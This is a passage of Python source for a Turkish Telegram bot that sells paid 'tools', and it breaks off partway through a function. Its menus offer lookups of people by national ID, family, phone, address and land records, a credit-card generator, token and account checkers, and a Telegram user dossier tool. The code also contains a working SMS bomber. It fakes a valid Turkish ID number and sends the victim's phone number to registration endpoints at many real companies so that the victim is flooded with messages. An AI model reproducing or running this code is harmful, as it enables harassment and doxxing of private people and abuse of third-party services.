    "tr": {"tc": "🆔 TC (11 hane):", "tcpro": "🔍 TC:", "adsoyad": "👤 Ad Soyad:",
           "aile": "👨‍👩‍👧 TC:", "ailepro": "👨‍👩‍👧‍👦 TC:", "sulale": "🌳 TC:",
           "tcgsm": "📱 TC:", "gsmtc": "📞 GSM:", "eokul": "🎓 TC:", "tapu": "🏠 TC:",
           "adaparsel": "🗺️ İl,İlçe:", "adres": "🏠 TC:"},
    "en": {"tc": "TC:", "tcpro": "TC:", "adsoyad": "Name:", "aile": "TC:", "ailepro": "TC:",
           "sulale": "TC:", "tcgsm": "TC:", "gsmtc": "GSM:", "eokul": "TC:", "tapu": "TC:",
           "adaparsel": "Province,District:", "adres": "TC:"},
    "ar": {"tc": "الهوية:", "tcpro": "الهوية:", "adsoyad": "الاسم:", "aile": "الهوية:", "ailepro": "الهوية:",
           "sulale": "الهوية:", "tcgsm": "الهوية:", "gsmtc": "GSM:", "eokul": "الهوية:", "tapu": "الهوية:",
           "adaparsel": "المحافظة,المنطقة:", "adres": "الهوية:"},
}

def tools_kb(user_id):
    mk = InlineKeyboardMarkup(row_width=2)
    ls_txt = "🌍 LeakSights OSINT ⭐" if is_premium_osint(user_id) else "🌍 LeakSights OSINT 🔒"
    mk.add(_btn("🇹🇷 Türkiye Sorguları", "menu_turkey"), _btn(ls_txt, "menu_ls"))
    mk.add(
        _btn("🎮 MC Bedrock", "tool_bedrock"), _btn("💳 CC Generator", "tool_ccgen"),
        _btn("🤖 Discord Token", "tool_dctoken"), _btn("✈️ TG Token", "tool_tgtoken"),
        _btn("💊 Eczane", "tool_eczane"), _btn("🌐 IP Bilgi", "tool_ipinfo"),
        _btn("🔎 DNS Sorgu", "tool_dns"), _btn("⚽ Bahis Sorgu", "tool_bahis"),
        _btn("🚗 Plaka Sorgu", "tool_plaka"), _btn("💎 PreDunyam", "tool_predunyam"),
        _btn("🛡️ Proxy Check", "tool_proxycheck"), _btn("🔍 URL Scan", "tool_urlscan"),
        _btn("🎥 Video İndir", "tool_video"), _btn("🎵 Müzik İndir", "tool_music"),
        _btn("🤖 Bot Ekle", "tool_addbot"), _btn("🐍 PHP→Python", "tool_php2py"),
        _btn("💣 SMS Bomber", "tool_smsbomb"), _btn("📧 Hotmail Checker", "tool_hotmail"),
        _btn("📸 EXIF Metadata", "tool_exif"),
        _btn("🎨 AI Resim Üret", "tool_aiimg"),
    )
    mk.add(_btn("🆔 Telegram ID Sorgu", "tool_tgid"))
    mk.add(_btn(s(user_id, "home_btn"), "goto_home"))
    return mk

def turkey_kb(user_id):
    mk = InlineKeyboardMarkup(row_width=2)
    def lbl(k): return TURKIYE_API[k].get(lang(user_id), TURKIYE_API[k]["tr"])
    mk.add(_sep("👤 KİMLİK"))
    mk.add(_btn(f"{TURKIYE_API['tc']['icon']} {lbl('tc')}", "tr_tc"),
           _btn(f"{TURKIYE_API['tcpro']['icon']} {lbl('tcpro')}", "tr_tcpro"))
    mk.add(_btn(f"{TURKIYE_API['adsoyad']['icon']} {lbl('adsoyad')}", "tr_adsoyad"))
    mk.add(_sep("👨‍👩‍👧 AİLE"))
    mk.add(_btn(f"{TURKIYE_API['aile']['icon']} {lbl('aile')}", "tr_aile"),
           _btn(f"{TURKIYE_API['ailepro']['icon']} {lbl('ailepro')}", "tr_ailepro"))
    mk.add(_btn(f"{TURKIYE_API['sulale']['icon']} {lbl('sulale')}", "tr_sulale"))
    mk.add(_sep("📱 İLETİŞİM"))
    mk.add(_btn(f"{TURKIYE_API['tcgsm']['icon']} {lbl('tcgsm')}", "tr_tcgsm"),
           _btn(f"{TURKIYE_API['gsmtc']['icon']} {lbl('gsmtc')}", "tr_gsmtc"))
    mk.add(_sep("🏠 MÜLK / EĞİTİM"))
    mk.add(_btn(f"{TURKIYE_API['tapu']['icon']} {lbl('tapu')}", "tr_tapu"),
           _btn(f"{TURKIYE_API['eokul']['icon']} {lbl('eokul')}", "tr_eokul"))
    mk.add(_btn(f"{TURKIYE_API['adaparsel']['icon']} {lbl('adaparsel')}", "tr_adaparsel"))
    mk.add(_btn(f"{TURKIYE_API['adres']['icon']} {lbl('adres')}", "tr_adres"))
    mk.add(_btn(s(user_id, "tools_btn"), "goto_tools"), _btn(s(user_id, "home_btn"), "goto_home"))
    return mk

def ls_kb(user_id):
    mk = InlineKeyboardMarkup(row_width=2)
    if not is_premium_osint(user_id):
        mk.add(_btn("🌍 OSINT Premium Satın Al (200⭐)", "buy_osint"))
        mk.add(_btn(s(user_id, "back_btn"), "goto_tools")); return mk
    cat_order = ["username", "contact", "ip", "url", "identity", "other"]
    groups = {c: [] for c in cat_order}
    for key, info in LEAKSIGHTS_API.items():
        groups.setdefault(info.get("cat","other"), []).append((key, info))
    l = lang(user_id)
    for cat in cat_order:
        items = groups.get(cat, [])
        if not items: continue
        mk.add(_sep(LEAKSIGHTS_CATS[cat].get(l, cat)))
        for key, info in items:
            mk.add(_btn(f"{info['icon']} {info.get(l, info.get('tr', key))}", f"ls_{key}"))
    mk.add(_btn(s(user_id, "tools_btn"), "goto_tools"), _btn(s(user_id, "home_btn"), "goto_home"))
    return mk

def premium_kb(user_id):
    mk = InlineKeyboardMarkup(row_width=1)
    mk.add(_btn("⭐ Premium Satın Al (400⭐)", "buy_premium"))
    mk.add(_btn("🌍 OSINT Premium Satın Al (200⭐)", "buy_osint"))
    mk.add(_btn(s(user_id, "home_btn"), "goto_home"))
    return mk

def tgid_kb(user_id):
    mk = InlineKeyboardMarkup(row_width=1)
    free_left = max(0, TGID_FREE_LIMIT - tgid_get_free_used(user_id))
    balance   = tgid_get_balance(user_id)
    if user_id == ADMIN_ID: durum = "👑 Admin — Sınırsız"
    elif is_premium(user_id): durum = "⭐ Premium — Sınırsız"
    else: durum = f"🆓 Free: {free_left}/{TGID_FREE_LIMIT}  |  💰 {balance}"
    mk.add(_btn(f"📊 {durum}", "noop"))
    mk.add(_btn("🔍 Sorgu Yap", "tgid_search"))
    mk.add(_btn("💎 Paket Satın Al", "tgid_packages"))
    mk.add(_btn("📊 İstatistiklerim", "tgid_my_stats"))
    mk.add(_btn("◀️ Geri", "goto_tools"))
    return mk

def tgid_packages_kb():
    mk = InlineKeyboardMarkup(row_width=1)
    mk.add(_btn(f"💎 {TGID_PACKAGE_25} Sorgu — {TGID_PRICE_25} ⭐", "tgid_buy_25"))
    mk.add(_btn(f"💎 {TGID_PACKAGE_50} Sorgu — {TGID_PRICE_50} ⭐", "tgid_buy_50"))
    mk.add(_btn(f"💎 {TGID_PACKAGE_100} Sorgu — {TGID_PRICE_100} ⭐", "tgid_buy_100"))
    mk.add(_btn("◀️ Geri", "tool_tgid"))
    return mk

def aiimg_kb(user_id):
    mk = InlineKeyboardMarkup(row_width=1)
    free_left = max(0, AI_IMG_FREE_LIMIT - aiimg_get_free_used(user_id))
    credits   = aiimg_get_credits(user_id)
    if user_id == ADMIN_ID: durum = "👑 Admin — Sınırsız"
    elif is_premium(user_id): durum = "⭐ Premium — Sınırsız"
    else: durum = f"🆓 Free: {free_left}/{AI_IMG_FREE_LIMIT}  |  💎 {credits}"
    mk.add(_btn(f"📊 {durum}", "noop"))
    mk.add(_btn("🎨 Resim Üret", "aiimg_generate"))
    mk.add(_btn("💎 Paket Satın Al", "aiimg_packages"))
    mk.add(_btn("📊 İstatistiklerim", "aiimg_my_stats"))
    mk.add(_btn("◀️ Geri", "goto_tools"))
    return mk

def aiimg_packages_kb():
    mk = InlineKeyboardMarkup(row_width=1)
    mk.add(_btn(f"💎 {AI_IMG_PACK_25} Hak — {AI_IMG_PRICE_25} ⭐", "aiimg_buy_25"))
    mk.add(_btn(f"💎 {AI_IMG_PACK_50} Hak — {AI_IMG_PRICE_50} ⭐", "aiimg_buy_50"))
    mk.add(_btn(f"💎 {AI_IMG_PACK_250} Hak — {AI_IMG_PRICE_250} ⭐", "aiimg_buy_250"))
    mk.add(_btn("◀️ Geri", "tool_aiimg"))
    return mk

# ══════════════════════════════════════════════════════════════
#  🆔 TG-ID SORGU
# ══════════════════════════════════════════════════════════════
def tgid_normalize_response(raw):
    if not isinstance(raw, dict): return raw
    mapping = {"doğrulandı": "verified", "dogrulandi": "verified",
               "yanlış": "attach_menu_enabled_disabled", "yanlis": "attach_menu_enabled_disabled"}
    return {mapping.get(k, k): v for k, v in raw.items()}

def tgid_clean_inner_json(s):
    try: return json.loads(s)
    except: pass
    try:
        s = re.sub(r':\s*yanlış\b', ': false', s, flags=re.IGNORECASE)
        s = re.sub(r':\s*doğru\b', ': true', s, flags=re.IGNORECASE)
        s = s.replace('"doğrulandı"', '"verified"')
        s = re.sub(r',\s*}', '}', s)
        return json.loads(s)
    except: return None

def tgid_api_search(username):
    try:
        username = username.strip().lstrip("@").strip()
        if not username: return False, "❌ Boş olamaz!"
        if len(username) < 2: return False, "❌ En az 2 karakter!"
        url = TGID_API_BASE + username
        headers = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}
        r = requests.get(url, headers=headers, timeout=25, verify=False)
        if r.status_code != 200: return False, f"❌ HTTP {r.status_code}"
        try: outer = r.json()
        except: return False, "❌ Geçersiz cevap"
        if outer.get("status") == "success" and "data" in outer:
            ir = outer.get("data", "")
            if isinstance(ir, str):
                inner = tgid_clean_inner_json(ir)
                if inner is None: return False, "⚠️ Parse hatası"
            else: inner = ir
            return True, tgid_normalize_response(inner)
        if outer.get("durum") in ("başarı", "basarili"):
            ir = outer.get("veri", "")
            if isinstance(ir, str):
                inner = tgid_clean_inner_json(ir)
                if inner is None: return False, "⚠️ Parse hatası"
            else: inner = ir
            return True, tgid_normalize_response(inner)
        if "id" in outer and ("first_name" in outer or "username" in outer):
            return True, tgid_normalize_response(outer)
        st = outer.get("status", outer.get("durum", "bilinmiyor"))
        if st == "pending": return False, "⏳ Kuyruğa alındı. 10 sn sonra tekrar dene."
        return False, f"❌ Sonuç yok. Durum: <code>{esc(st)}</code>"
    except requests.exceptions.Timeout: return False, "⏰ Zaman aşımı!"
    except requests.exceptions.ConnectionError: return False, "🌐 Bağlantı hatası!"
    except Exception as e: return False, f"❌ Hata: <code>{esc(e)}</code>"

def tgid_build_txt_report(username, data, queried_by=""):
    def b(v): return "✅ Evet" if v else "❌ Hayır"
    def sv(v, default="—"):
        if v is None or v == "": return default
        return str(v)
    lines = []
    sep = "═" * 55
    lines.append(sep)
    lines.append("        🆔 TELEGRAM ID SORGU RAPORU")
    lines.append(sep)
    lines.append(f" 🎯 Sorgulanan   : @{username.lstrip('@')}")
    lines.append(f" 👤 Sorgulayan   : {queried_by}")
    lines.append(f" 📅 Tarih        : {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}")
    lines.append(sep); lines.append("")
    lines.append(" 👤 TEMEL KİMLİK BİLGİLERİ"); lines.append("─" * 40)
    lines.append(f"  🆔 ID            : {sv(data.get('id'))}")
    lines.append(f"  📛 Ad            : {sv(data.get('first_name'))}")
    lines.append(f"  📛 Soyad         : {sv(data.get('last_name'))}")
    lines.append(f"  🔗 Kullanıcı Adı : @{sv(data.get('username'), 'Yok')}")
    lines.append(f"  📱 Telefon       : {sv(data.get('phone'), 'Gizli')}")
    lines.append(f"  🌐 Dil Kodu      : {sv(data.get('lang_code'), '—')}"); lines.append("")
    lines.append(" 🏷️ HESAP TÜRÜ & DURUM"); lines.append("─" * 40)
    lines.append(f"  🤖 Bot mu?            : {b(data.get('bot'))}")
    lines.append(f"  ✅ Doğrulanmış        : {b(data.get('verified'))}")
    lines.append(f"  ⭐ Premium            : {b(data.get('premium'))}")
    lines.append(f"  🚨 Scam               : {b(data.get('scam'))}")
    lines.append(f"  🎭 Fake               : {b(data.get('fake'))}")
    lines.append(f"  🗑️ Silinmiş           : {b(data.get('deleted'))}"); lines.append("")
    status = data.get("status", {})
    if isinstance(status, dict):
        lines.append(" 🕐 SON GÖRÜLME"); lines.append("─" * 40)
        st = status.get("_", "Bilinmiyor")
        sm = {"UserStatusRecently":"🟢 Son zamanlarda online","UserStatusOnline":"🟢 Şu an online",
              "UserStatusOffline":"⚫ Çevrimdışı","UserStatusLastWeek":"🟡 Son 1 hafta",
              "UserStatusLastMonth":"🟠 Son 1 ay","UserStatusEmpty":"❓ Belirsiz"}
        lines.append(f"  📌 Durum: {sm.get(st, st)}")
        if "was_online" in status and status["was_online"]:
            try:
                was = datetime.fromtimestamp(status["was_online"]).strftime("%d.%m.%Y %H:%M:%S")
                lines.append(f"  🕰️ Son Görülme: {was}")
            except: pass
        lines.append("")
    lines.append(sep)
    lines.append(" 📌 Bu rapor gettg.id API ile oluşturuldu.")
    lines.append(" 👨‍💻 @hackledin")
    lines.append(sep)
    return "\n".join(lines)

def tgid_summary_caption(username, data, user_id):
    free_left = max(0, TGID_FREE_LIMIT - tgid_get_free_used(user_id))
    balance   = tgid_get_balance(user_id)
    if user_id == ADMIN_ID: hak = "👑 Admin — Sınırsız"
    elif is_premium(user_id): hak = "⭐ Premium — Sınırsız"
    else: hak = f"🆓 Free: {free_left}/{TGID_FREE_LIMIT} | 💰 {balance}"
    ad = data.get("first_name") or "—"
    soyad = data.get("last_name") or ""
    isim = f"{ad} {soyad}".strip() or "—"
    kadi = data.get("username") or "Yok"
    uid_ = data.get("id", "—")
    return (f"✅ <b>Telegram ID Sorgu Başarılı!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>@{esc(kadi)}</b>\n"
            f"📛 İsim: <b>{esc(isim)}</b>\n"
            f"🆔 ID: <code>{esc(uid_)}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"⭐ Premium: {'⭐ Evet' if data.get('premium') else '❌ Hayır'}\n"
            f"✅ Doğrulanmış: {'✅ Evet' if data.get('verified') else '❌ Hayır'}\n"
            f"🤖 Bot: {'🤖 Evet' if data.get('bot') else '👤 Hayır'}\n"
            f"🚨 Scam: {'🚨 EVET' if data.get('scam') else '✅ Hayır'}\n"
            f"🎭 Fake: {'🎭 EVET' if data.get('fake') else '✅ Hayır'}\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 {hak}\n"
            f"📄 <i>Detaylı rapor TXT'de</i>")

def tgid_process_search(msg, bot_instance):
    uid = msg.from_user.id
    username = msg.text.strip().lstrip("@").strip()
    if not username:
        bot_instance.reply_to(msg, "❌ Geçersiz!", parse_mode="HTML"); return
    allowed, _ = tgid_can_query(uid)
    if not allowed:
        free_left = max(0, TGID_FREE_LIMIT - tgid_get_free_used(uid))
        bot_instance.reply_to(msg,
            f"❌ <b>Sorgu hakkınız kalmadı!</b>\n"
            f"🆓 Free: {free_left}/{TGID_FREE_LIMIT}\n"
            f"💰 Bakiye: {tgid_get_balance(uid)}",
            reply_markup=tgid_packages_kb(), parse_mode="HTML")
        return
    wait = bot_instance.reply_to(msg, f"⏳ <code>@{esc(username)}</code> sorgulanıyor...", parse_mode="HTML")
    success, data = tgid_api_search(username)
    if not success:
        try: bot_instance.edit_message_text(data, msg.chat.id, wait.message_id, parse_mode="HTML")
        except:
            try: bot_instance.send_message(msg.chat.id, data, parse_mode="HTML")
            except: bot_instance.send_message(msg.chat.id, data)
        tgid_log_query(uid, msg.from_user.username or "", username, "FAIL", str(data)[:100]); return
    tgid_use_query(uid)
    qb = f"@{msg.from_user.username}" if msg.from_user.username else str(uid)
    report = tgid_build_txt_report(username, data, qb)
    fname = f"TG-ID_{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    try:
        with open(fname, "w", encoding="utf-8") as f: f.write(report)
    except Exception as e:
        bot_instance.edit_message_text(f"❌ {esc(e)}", msg.chat.id, wait.message_id, parse_mode="HTML"); return
    caption = tgid_summary_caption(username, data, uid)
    try:
        with open(fname, "rb") as f:
            bot_instance.send_document(msg.chat.id, f, caption=caption, parse_mode="HTML")
        bot_instance.delete_message(msg.chat.id, wait.message_id)
    except Exception as e:
        bot_instance.send_message(msg.chat.id, f"❌ Dosya hatası: <code>{esc(e)}</code>", parse_mode="HTML")
    finally:
        if os.path.exists(fname):
            try: os.remove(fname)
            except: pass
    tgid_log_query(uid, msg.from_user.username or "", username, "OK", f"ID={data.get('id')}")

def tgid_show_my_stats(chat_id, uid, bot_instance):
    free_used = tgid_get_free_used(uid)
    free_left = max(0, TGID_FREE_LIMIT - free_used)
    balance = tgid_get_balance(uid)
    total = tgid_get_total(uid)
    txt = (f"📊 <b>TG-ID İSTATİSTİKLERİN</b>\n"
           f"━━━━━━━━━━━━━━━━━━━━━\n"
           f"🔍 Toplam: <b>{total}</b>\n"
           f"🆓 Free kullanılan: <b>{free_used}</b>/{TGID_FREE_LIMIT}\n"
           f"🆓 Free kalan: <b>{free_left}</b>\n"
           f"💰 Bakiye: <b>{balance}</b>")
    if uid == ADMIN_ID: txt += "\n\n👑 <b>Admin — Sınırsız</b>"
    elif is_premium(uid): txt += "\n\n⭐ <b>Premium — Sınırsız</b>"
    bot_instance.send_message(chat_id, txt, parse_mode="HTML")

# ══════════════════════════════════════════════════════════════
#  🎨 AI IMAGE İŞLEME
# ══════════════════════════════════════════════════════════════
def aiimg_process(msg, bot_instance):
    uid = msg.from_user.id
    if is_banned(uid):
        bot_instance.reply_to(msg, "🚫 <b>YASAKLANDINIZ!</b>", parse_mode="HTML"); return
    allowed, _ = aiimg_can_use(uid)
    if not allowed:
        free_left = max(0, AI_IMG_FREE_LIMIT - aiimg_get_free_used(uid))
        bot_instance.reply_to(msg,
            f"❌ <b>AI Resim hakkınız kalmadı!</b>\n"
            f"🆓 Free: {free_left}/{AI_IMG_FREE_LIMIT}\n"
            f"💎 Hak: {aiimg_get_credits(uid)}",
            reply_markup=aiimg_packages_kb(), parse_mode="HTML")
        return
    if not msg.photo and not msg.document:
        bot_instance.reply_to(msg, "❌ Fotoğraf gönder!", parse_mode="HTML"); return
    try:
        if msg.photo:
            file_info = bot_instance.get_file(msg.photo[-1].file_id)
        else:
            file_info = bot_instance.get_file(msg.document.file_id)
        dosya = bot_instance.download_file(file_info.file_path)
    except Exception as e:
        bot_instance.reply_to(msg, f"❌ Fotoğraf indirilemedi: {esc(e)}", parse_mode="HTML"); return
    temp_dir = "aiimg_temp"
    os.makedirs(temp_dir, exist_ok=True)
    temp_path = os.path.join(temp_dir, f"{uid}_{int(time.time())}.jpg")
    try:
        with open(temp_path, "wb") as f: f.write(dosya)
    except Exception as e:
        bot_instance.reply_to(msg, f"❌ Kaydedilemedi: {esc(e)}", parse_mode="HTML"); return
    m = bot_instance.reply_to(msg,
        "✍️ <b>Şimdi promptu (komutu) yaz:</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "📝 <b>Örnekler:</b>\n"
        "• <i>Lift your heart</i>\n"
        "• <i>Cyberpunk style</i>\n"
        "• <i>Turn into anime</i>\n"
        "• <i>Oil painting effect</i>\n\n"
        "⚠️ <b>30-100 saniye</b> sürebilir.",
        parse_mode="HTML")
    bot_instance.register_next_step_handler(m, lambda m: aiimg_run(m, temp_path, bot_instance))

def aiimg_run(msg, temp_path, bot_instance):
    uid = msg.from_user.id
    prompt = msg.text.strip() if msg.text else ""
    if not prompt:
        bot_instance.reply_to(msg, "❌ Prompt boş!", parse_mode="HTML")
        try: os.remove(temp_path)
        except: pass
        return
    aiimg_use(uid)
    wait = bot_instance.reply_to(msg,
        f"🎨 <b>AI Resim üretiliyor...</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📝 Prompt: <code>{esc(prompt[:200])}</code>\n"
        f"⏳ <i>30-100 saniye sürebilir.</i>",
        parse_mode="HTML")

    def run():
        try:
            success, result = aiimg_generate(temp_path, prompt)
            if not success:
                if uid != ADMIN_ID and not is_premium(uid):
                    if aiimg_get_total(uid) <= AI_IMG_FREE_LIMIT:
                        aiimg_set(uid, "free_used", max(0, aiimg_get_free_used(uid) - 1))
                    else:
                        aiimg_set(uid, "credit_balance", aiimg_get_credits(uid) + 1)
                aiimg_log(uid, msg.from_user.username or "", prompt, "FAIL", "")
                try:
                    bot_instance.edit_message_text(
                        f"❌ <b>Üretim başarısız!</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━\n"
                        f"Hak iade edildi.\n\n<code>{esc(result[:400])}</code>",
                        msg.chat.id, wait.message_id, parse_mode="HTML")
                except:
                    try: bot_instance.send_message(msg.chat.id, f"❌ {esc(result)}", parse_mode="HTML")
                    except: bot_instance.send_message(msg.chat.id, result)
                return
            aiimg_log(uid, msg.from_user.username or "", prompt, "OK", result)
            free_left = max(0, AI_IMG_FREE_LIMIT - aiimg_get_free_used(uid))
            credits = aiimg_get_credits(uid)
            if uid == ADMIN_ID: hak = "👑 Admin — Sınırsız"
            elif is_premium(uid): hak = "⭐ Premium — Sınırsız"
            else: hak = f"🆓 Free: {free_left}/{AI_IMG_FREE_LIMIT} | 💎 {credits}"
            caption = (f"✅ <b>AI Resim Hazır!</b>\n"
                       f"━━━━━━━━━━━━━━━━━━━━━\n"
                       f"📝 Prompt: <code>{esc(prompt[:200])}</code>\n"
                       f"━━━━━━━━━━━━━━━━━━━━━\n"
                       f"📊 {hak}\n"
                       f"🔗 <a href='{result}'>Görseli Aç</a>")
            try:
                ir = requests.get(result, timeout=60)
                if ir.status_code == 200:
                    bot_instance.send_photo(msg.chat.id, ir.content, caption=caption, parse_mode="HTML")
                else:
                    bot_instance.send_message(msg.chat.id, caption, disable_web_page_preview=False, parse_mode="HTML")
            except:
                bot_instance.send_message(msg.chat.id, caption, disable_web_page_preview=False, parse_mode="HTML")
            try: bot_instance.delete_message(msg.chat.id, wait.message_id)
            except: pass
        except Exception as e:
            print(f"[AI-IMG] Run hatası: {e}")
            try:
                bot_instance.edit_message_text(f"❌ Hata: <code>{esc(e)}</code>", msg.chat.id, wait.message_id, parse_mode="HTML")
            except: pass
        finally:
            try: os.remove(temp_path)
            except: pass
    threading.Thread(target=run, daemon=True).start()

def aiimg_show_stats(chat_id, uid, bot_instance):
    free_used = aiimg_get_free_used(uid)
    free_left = max(0, AI_IMG_FREE_LIMIT - free_used)
    credits = aiimg_get_credits(uid)
    total = aiimg_get_total(uid)
    txt = (f"📊 <b>AI RESİM İSTATİSTİKLERİN</b>\n"
           f"━━━━━━━━━━━━━━━━━━━━━\n"
           f"🎨 Toplam: <b>{total}</b>\n"
           f"🆓 Free kullanılan: <b>{free_used}</b>/{AI_IMG_FREE_LIMIT}\n"
           f"🆓 Free kalan: <b>{free_left}</b>\n"
           f"💎 Hak: <b>{credits}</b>")
    if uid == ADMIN_ID: txt += "\n\n👑 <b>Admin — Sınırsız</b>"
    elif is_premium(uid): txt += "\n\n⭐ <b>Premium — Sınırsız</b>"
    bot_instance.send_message(chat_id, txt, parse_mode="HTML")

# ══════════════════════════════════════════════════════════════
#  MULTI-BOT
# ══════════════════════════════════════════════════════════════
_CHILD_PROCS = {}
_PROC_LOCK = threading.Lock()

def _load_registry():
    if not os.path.exists(BOT_REGISTRY_FILE): return {}
    try:
        with open(BOT_REGISTRY_FILE, "r", encoding="utf-8") as f: return json.load(f)
    except: return {}

def _save_registry(registry):
    with open(BOT_REGISTRY_FILE, "w", encoding="utf-8") as f:
        json.dump(registry, f, indent=2)

def _spawn_bot(token, owner_id=None):
    if token == BOT_TOKEN: return False
    with _PROC_LOCK:
        if token in _CHILD_PROCS:
            if _CHILD_PROCS[token].poll() is None: return False
        args = [sys.executable, os.path.abspath(__file__), "--bot", token, "--owner", str(owner_id)]
        try:
            proc = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                    stdin=subprocess.DEVNULL,
                                    creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
                                    start_new_session=True)
            _CHILD_PROCS[token] = proc
            registry = _load_registry()
            registry[token] = {"owner_id": owner_id, "pid": proc.pid, "added": datetime.now().isoformat()}
            _save_registry(registry)
            return True
        except: return False

def start_saved_bots():
    registry = _load_registry()
    if not registry: return
    if BOT_TOKEN in registry:
        del registry[BOT_TOKEN]; _save_registry(registry)
    for token, info in registry.items():
        _spawn_bot(token, info.get("owner_id"))

# ══════════════════════════════════════════════════════════════
#  SMS BOMBER
# ══════════════════════════════════════════════════════════════
_SMS_SESSIONS = {}
_SMS_LOCK = threading.Lock()

class SendSms:
    adet = 0
    def __init__(self, phone, mail):
        rakam = []; tcNo = ""
        rakam.append(randint(1, 9))
        for i in range(1, 9): rakam.append(randint(0, 9))
        rakam.append(((rakam[0]+rakam[2]+rakam[4]+rakam[6]+rakam[8])*7 - (rakam[1]+rakam[3]+rakam[5]+rakam[7])) % 10)
        rakam.append((sum(rakam[:10])) % 10)
        for r in rakam: tcNo += str(r)
        self.tc = tcNo
        self.phone = str(phone)
        self.mail = mail if mail else ''.join(choice(ascii_lowercase) for _ in range(22)) + "@gmail.com"

    def KahveDunyasi(self):
        try:
            r = requests.post("https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number",
                headers={"User-Agent":"Mozilla/5.0","Content-Type":"application/json","X-Language-Id":"tr-TR","X-Client-Platform":"web","Origin":"https://www.kahvedunyasi.com"},
                json={"countryCode":"90","phoneNumber":self.phone}, timeout=6)
            if r.json().get("processStatus") == "Success": self.adet += 1
        except: pass
    def Wmf(self):
        try:
            r = requests.post("https://www.wmf.com.tr/users/register/",
                data={"confirm":"true","date_of_birth":"1956-03-01","email":self.mail,"email_allowed":"true","first_name":"Memati","gender":"male","last_name":"Bas","password":"31ABC..abc31","phone":f"0{self.phone}"}, timeout=6)
            if r.status_code == 202: self.adet += 1
        except: pass
    def Hepsiburada(self):
        try:
            r = requests.post("https://www.hepsiburada.com/api/Register/RegisterUser",
                json={"PhoneNumber":f"90{self.phone}","Email":self.mail,"Password":"Password123","FirstName":"Ahmet","LastName":"Yilmaz","Consent":True}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Trendyol(self):
        try:
            r = requests.post("https://www.trendyol.com/api/users/v1/register",
                json={"phoneNumber":f"90{self.phone}","email":self.mail,"password":"Password123","firstName":"Ali","lastName":"Demir","consent":True}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def N11(self):
        try:
            r = requests.post("https://www.n11.com/api/User/Register",
                json={"Phone":f"90{self.phone}","Email":self.mail,"Password":"Password123","Name":"Mehmet","Surname":"Kaya","Consent":True}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Sahibinden(self):
        try:
            r = requests.post("https://www.sahibinden.com/api/User/Register",
                json={"Phone":f"90{self.phone}","Email":self.mail,"Password":"Password123","FirstName":"Can","LastName":"Yilmaz","Consent":True}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Letgo(self):
        try:
            r = requests.post("https://api.letgo.com/api/v1/users",
                json={"phone":f"90{self.phone}","email":self.mail,"password":"Password123","name":"Ayse","surname":"Yilmaz"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Dolap(self):
        try:
            r = requests.post("https://www.dolap.com/api/v2/users",
                json={"phone":f"90{self.phone}","email":self.mail,"password":"Password123","username":f"user_{randint(1000,9999)}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def AmazonTR(self):
        try:
            r = requests.post("https://www.amazon.com.tr/ap/register",
                data={"email":self.mail,"password":"Password123","name":"Ali","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Spotify(self):
        try:
            r = requests.post("https://www.spotify.com/api/signup",
                data={"email":self.mail,"password":"Password123","display_name":"User","phone":f"90{self.phone}","consent":True}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Netflix(self):
        try:
            r = requests.post("https://www.netflix.com/api/signup",
                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Discord(self):
        try:
            r = requests.post("https://discord.com/api/v9/auth/register",
                json={"email":self.mail,"username":f"user_{randint(1000,9999)}","password":"Password123","consent":True,"phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Instagram(self):
        try:
            r = requests.post("https://www.instagram.com/api/v1/web/accounts/web_create_ajax/attempt/",
                data={"email":self.mail,"username":f"user_{randint(1000,9999)}","password":"Password123","phone_number":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Facebook(self):
        try:
            r = requests.post("https://www.facebook.com/api/v1/register",
                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}","first_name":"Ahmet","last_name":"Yilmaz"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Telegram(self):
        try:
            r = requests.post("https://telegram.org/api/register",
                data={"phone":f"90{self.phone}","email":self.mail}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def WhatsApp(self):
        try:
            r = requests.post("https://www.whatsapp.com/api/register",
                data={"phone":f"90{self.phone}","email":self.mail}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def TikTok(self):
        try:
            r = requests.post("https://www.tiktok.com/api/v1/auth/register",
